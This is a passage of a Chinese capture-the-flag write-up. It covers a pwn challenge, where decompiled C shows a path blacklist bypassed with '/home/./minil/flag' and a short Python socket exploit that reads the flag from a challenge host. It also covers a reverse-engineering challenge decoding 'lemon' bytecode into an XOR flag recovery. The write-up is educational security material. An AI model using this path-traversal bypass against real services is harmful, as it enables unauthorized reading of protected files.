char *__fastcall sub_15BF(const char *a1)
{
  char *v2; // [rsp+10h] [rbp-220h]
  char *v3; // [rsp+18h] [rbp-218h]
  char s[256]; // [rsp+20h] [rbp-210h] BYREF
  char s1[264]; // [rsp+120h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+228h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v2 = strstr(a1, "User-Agent: ");
  if ( !v2 )
    return 0LL;
  __isoc99_sscanf(v2, "User-Agent: %s\r\n\r\n", s1);
  if ( strcmp(s1, "MiniL") )
    return 0LL;
  v3 = strstr(a1, "GET ");
  if ( !v3 )
    return 0LL;
  __isoc99_sscanf(v3, "GET %s\r\n", s);
  return strdup(s);
}
```

这个函数就是把之前接收到的数据处理一下, 接受到的数据中含有 `"User-Agent: MiniL\r\n\r\n"` 和 `"GET $string\r\n"`, 然后就把 `$string` 内容返回. 由于之接收使碰到 `\r\n\r\n` 会停止, 所以输入可以把 `"GET $string"` 放在前.

sub_17DE 函数的最后一部分判断 `$string` 不是 `/home/minil/flag`, 然后执行 sub_14CE 函数, 传入的参数是 `$string` 和 socket fd.

```c
unsigned __int64 __fastcall sub_14CE(const char *a1, int a2)
{
  int *v2; // rax
  char *v3; // rax
  size_t v4; // rax
  FILE *stream; // [rsp+18h] [rbp-118h]
  char s[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v8; // [rsp+128h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  stream = fopen(a1, "r");
  if ( !stream )
  {
    v2 = __errno_location();
    v3 = strerror(*v2);
    fprintf(stderr, "fopen error:%s\n\a", v3);
  }
  __isoc99_fscanf(stream, "%s", s);
  fclose(stream);
  v4 = strlen(s);
  send(a2, s, v4, 0);
  return __readfsqword(0x28u) ^ v8;
}
```

这个函数就是打开 `$string` 文件, 然后通过 socket send 出去.

到这里整个程序就看完了, 获得 flag 的方法也很简单, 就是利用 socket 通信, 发送数据, 让程序打开 flag 文件, 然后接收返回的 flag. 虽然它过滤掉了 `"/home/minil/flag"`, 但是可以通过两个有趣的目录 `.` 和 `..` 绕过. 比如 `"/home/./minil/flag"` 和 `"/home/../home/minil/flag"`

exp:

```python
import socket

s = socket.socket()
# host = 'localhost'
# port = 2048
host = 'pwn.archive.xdsec.chall.frankli.site'
port = 10047
s.connect((host, port))

payload = b'GET /home/./minil/flag\r\nUser-Agent: MiniL\r\n\r\n'
s.send(payload)
print(s.recv(100))
```

## RE

### lemon \| Wings

给的文件是奇怪的解释语言指令, 根据提示搜索 lemon language. ~~然后从源码里找虚拟机部分编译运行这些指令~~

指令不长, 一边猜一边看, 整个逻辑还是很好理清楚的.

`const` 是压栈指令, `load` 和 `store` 是存取指令, 结合 `return`, 可以看出 `define` 是定义函数. 看到 `self`, `setattr`, `getattr` 这些东西, 猜想是类似于 python 的类和魔法方法. 从 lemon 的介绍可以看出, lemon 使用了 python 的这一模式. `call` 是调用函数.

根据 risc 知识和 load-store 指令知识, 加上合理猜测, 能够得出指令的用法:

- `const n; sth`: 第 n 条压栈指令, 把 sth 压入栈.
- `load x y`: 将存储空间 x 上, 偏移为 y 的数据压入栈. x = 0 时为函数的局部变量空间, 在本题中, 由于函数没有嵌套调用, 可以简单认为在函数中 load 时 x = 1 时为全局变量空间. 当然如果在函数外面, x = 0 是 "全局".
- `store x y`: 将栈上的数据弹出, 存入存储空间 x 上偏移 y 处.
- `define 0 0 a s l`: 定义函数, a 是参数, 取栈上的 sp 为函数名, sp-1, ... sp-a-1 为参数名. s 是局部变量个数, l 是这个函数接下来的指令长度.
- `setattr` 是取栈上的名字, 定义一个成员变量.
- `getattr` 是取栈上为名字, 引用一个成员变量, 压入栈.
- `getitem` 是取栈上为 index, 再取栈上为变量名 var, 得到 var[index] 压入栈.
- `return` 是取栈上数据, 函数返回该数据.
- `call n` 是调用函数, 其中, 取栈上 n 个数据作为参数.

其他指令如 lt, jz, bxor 顾名思义就行.

然后直接翻译出给人看的代码:

```python
v = 221492336
def nxt():
    global v
    v = v * 3735928559
    v = v + 2974593325
    v = v % 4294967295
    return v

class A:
    def __init__(self, n):
        self.enc = []
        self.flag = []
        self.res = [2141786733,
                    76267819,
                    37219027,
                    219942343,
                    755999918,
                    701306806,
                    532732060,
                    334234642,
                    524809386,
                    333469062,
                    160092960,
                    126810196,
                    238089888,
                    301365991,
                    258515107,
                    424705310,
                    1041878913,
                    618187854,
                    4680810,
                    827308967,
                    66957703,
                    924471115,
                    735310319,
                    541128627,
                    47689903,
                    459905620,
                    495518230,
                    167708778,
                    586337393,
                    521761774,
                    861166604,
                    626644061,
                    1030425184,
                    665229750,
                    330150339]

        for i in range(n):
            self.enc.append(nxt())

    def sign(self, x, y):
        for i in range(35):
            self.flag.append(x[i] ^ y[i])


a = A(35)
a.sign(a.enc, a.res)
print(a.flag)
```

确实很简单吧.

然后激动的跑一下, 结果只有第一个是可见字符...

问了一下云姐姐, 这玩意必须用 lemon 跑... python 和 C 都不行...

抽 象

~~快进到 lemon 出现在 pwn 题中~~

exp (lemon):

```c
var v = 221492336;
var enc = [];
for (var i = 0; i < 35; i += 1) {
    v = v * 3735928559;
    v = v + 2974593325;
    v = v % 4294967295;
    enc.append(v);
}

var res = [2141786733,
        76267819,
        37219027,
        219942343,
        755999918,
        701306806,
        532732060,
        334234642,
        524809386,
        333469062,
        160092960,
        126810196,
        238089888,
        301365991,
        258515107,
        424705310,
        1041878913,
        618187854,
        4680810,
        827308967,
        66957703,
        924471115,
        735310319,
        541128627,
        47689903,
        459905620,
        495518230,
        167708778,
        586337393,
        521761774,
        861166604,
        626644061,
        1030425184,
        665229750,
        330150339];


for (i = 0; i < 35; i += 1) {
    print(res[i] ^ enc[i]);
}
```
